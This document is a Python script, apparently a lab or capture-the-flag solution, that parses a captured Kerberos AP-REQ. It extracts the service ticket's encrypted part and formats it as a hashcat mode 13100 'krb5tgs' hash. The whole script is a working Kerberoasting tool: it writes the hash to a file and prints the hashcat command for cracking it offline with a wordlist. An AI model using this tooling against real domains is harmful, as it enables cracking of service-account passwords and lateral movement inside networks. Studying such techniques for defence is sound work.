#!/usr/bin/env python3
import os, sys

basedir = os.path.dirname(os.path.abspath(__file__))
with open(os.path.join(basedir, 'apreq_hex.txt')) as f:
    raw_hex = f.read().strip()

data = bytes.fromhex(raw_hex)

def parse_tl(buf, offset):
    tag = buf[offset]
    off = offset + 1
    if buf[off] & 0x80 == 0:
        return tag, buf[off], 2
    nb = buf[off] & 0x7F
    off += 1
    length = 0
    for i in range(nb):
        length = (length << 8) | buf[off + i]
    return tag, length, 2 + nb

def parse_int(buf, offset):
    tag, length, hdr = parse_tl(buf, offset)
    assert tag == 0x02
    val = int.from_bytes(buf[offset+hdr:offset+hdr+length], 'big', signed=True)
    return val, hdr + length

def parse_os(buf, offset):
    tag, length, hdr = parse_tl(buf, offset)
    assert tag == 0x04
    return buf[offset+hdr:offset+hdr+length], hdr + length

def parse_gs(buf, offset):
    tag, length, hdr = parse_tl(buf, offset)
    assert tag == 0x1B
    return buf[offset+hdr:offset+hdr+length].decode('ascii'), hdr + length

def find_ctx(buf, offset, end, num):
    pos = offset
    while pos < end:
        tag, length, hdr = parse_tl(buf, pos)
        if (tag & 0xC0) == 0x80 and (tag & 0x1F) == num:
            return pos + hdr, length
        pos += hdr + length
    return None

sep = '=' * 70
print(sep)
print('Kerberos AP-REQ TGS Hash Extractor')
print(sep)
print()

pos = 0
tag, gss_len, hdr = parse_tl(data, pos)
assert tag == 0x60
print('[+] GSS-API wrapper: tag=0x60, length=%d' % gss_len)
pos += hdr

oid_tag, oid_len, oid_hdr = parse_tl(data, pos)
assert oid_tag == 0x06
print('[+] OID: %s (Kerberos 5)' % data[pos+oid_hdr:pos+oid_hdr+oid_len].hex())
pos += oid_hdr + oid_len

print('[+] Token type: 0x%s' % data[pos:pos+2].hex())
pos += 2

tag, apreq_len, hdr = parse_tl(data, pos)
assert tag == 0x6E
print('[+] AP-REQ: tag=0x6E, length=%d' % apreq_len)
pos += hdr

tag, seq_len, hdr = parse_tl(data, pos)
assert tag == 0x30
print('[+] AP-REQ SEQUENCE: length=%d' % seq_len)
seq_start = pos + hdr
seq_end = seq_start + seq_len

result = find_ctx(data, seq_start, seq_end, 3)
assert result
ticket_offset, ticket_len = result
print('[+] Found Ticket [3] at offset %d' % ticket_offset)

tag, app_len, hdr = parse_tl(data, ticket_offset)
print('[+] Ticket inner tag: 0x%02X' % tag)
ti = ticket_offset + hdr
if tag == 0x61:
    t2, sl2, h2 = parse_tl(data, ti)
    assert t2 == 0x30
    tkt_start = ti + h2
    tkt_end = tkt_start + sl2
elif tag == 0x30:
    tkt_start = ti
    tkt_end = ti + app_len

r = find_ctx(data, tkt_start, tkt_end, 0)
if r:
    v, _ = parse_int(data, r[0])
    print('[+] tkt-vno: %d' % v)

realm = ''
r = find_ctx(data, tkt_start, tkt_end, 1)
if r:
    realm, _ = parse_gs(data, r[0])
    print('[+] realm: %s' % realm)

sname_parts = []
r = find_ctx(data, tkt_start, tkt_end, 2)
if r:
    sn_off, sn_len = r
    tag, pn_len, hdr = parse_tl(data, sn_off)
    pn_s = sn_off + hdr
    pn_e = pn_s + pn_len
    nr = find_ctx(data, pn_s, pn_e, 0)
    if nr:
        nt, _ = parse_int(data, nr[0])
        print('[+] sname name-type: %d' % nt)
    ns = find_ctx(data, pn_s, pn_e, 1)
    if ns:
        tag, sof_len, hdr = parse_tl(data, ns[0])
        p = ns[0] + hdr
        sof_end = p + sof_len
        while p < sof_end:
            s, consumed = parse_gs(data, p)
            sname_parts.append(s)
            p += consumed
    print('[+] sname: %s' % '/'.join(sname_parts))

r = find_ctx(data, tkt_start, tkt_end, 3)
assert r
ep_off, ep_len = r
print('[+] Found enc-part [3] at offset %d' % ep_off)

tag, ed_len, hdr = parse_tl(data, ep_off)
assert tag == 0x30
ed_s = ep_off + hdr
ed_e = ed_s + ed_len

r = find_ctx(data, ed_s, ed_e, 0)
assert r
etype, _ = parse_int(data, r[0])
enames = {17: 'AES128', 18: 'AES256', 23: 'RC4-HMAC'}
print('[+] etype: %d (%s)' % (etype, enames.get(etype, 'unknown')))

r = find_ctx(data, ed_s, ed_e, 1)
if r:
    kvno, _ = parse_int(data, r[0])
    print('[+] kvno: %d' % kvno)

r = find_ctx(data, ed_s, ed_e, 2)
assert r
cipher, _ = parse_os(data, r[0])
print('[+] cipher: %d bytes' % len(cipher))

checksum = cipher[:16]
edata2 = cipher[16:]
print('[+] checksum (16 bytes): %s' % checksum.hex())
print('[+] edata2 (%d bytes): %s...' % (len(edata2), edata2.hex()[:80]))

username = 'alice'
spn = '/'.join(sname_parts) + '@' + realm
D = chr(36)
h = D+'krb5tgs'+D+str(etype)+D+'*'+username+D+realm+D+spn+'*'+D+checksum.hex()+D+edata2.hex()

print()
print(sep)
print('HASHCAT HASH (mode 13100):')
print(sep)
print(h)
print()
print('Hash length: %d characters' % len(h))
print()
print('To crack: hashcat -m 13100 tgs_hash.txt wordlist.txt')

outpath = os.path.join(basedir, 'tgs_hash.txt')
with open(outpath, 'w') as f:
    f.write(h + chr(10))
print()
print('[+] Hash written to ' + outpath)
